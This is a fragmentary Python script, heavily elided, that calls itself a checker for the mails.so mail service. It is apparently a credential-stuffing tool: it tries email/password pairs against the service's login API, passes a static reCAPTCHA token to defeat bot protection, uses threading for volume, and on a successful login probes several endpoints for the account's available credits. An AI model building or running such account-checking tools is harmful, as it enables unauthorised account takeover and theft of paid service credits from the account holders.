"""
Checker for mails.so (mail service)
Uses the API endpoint: https://api.mails.so/auth/login
Also attempts to fetch available credits.
"""
import requests
import threading
import json
...
def check(email: str, password: str) -> Tuple[bool, str]:
    ...
    payload = {
        "email": email,
        "password": password,
        "recaptchaToken": STATIC_RECAPTCHA_TOKEN
    }
    ...
    try:
        ...
        if data.get("status") == "success" or data.get("message") == "Logged in":
            # Login successful – now fetch credits
            credits = None
            # Try several possible endpoints for credits
            credit_endpoints = [
                "/user/credits",
                "/credits",
                "/account/credits",
                ...
                try:
                    ...
                    if cred_resp.status_code == 200:
                        ...
                        if "available" in cred_data:
                            ...
                            break
                        # If we got a valid response, maybe it's the user info
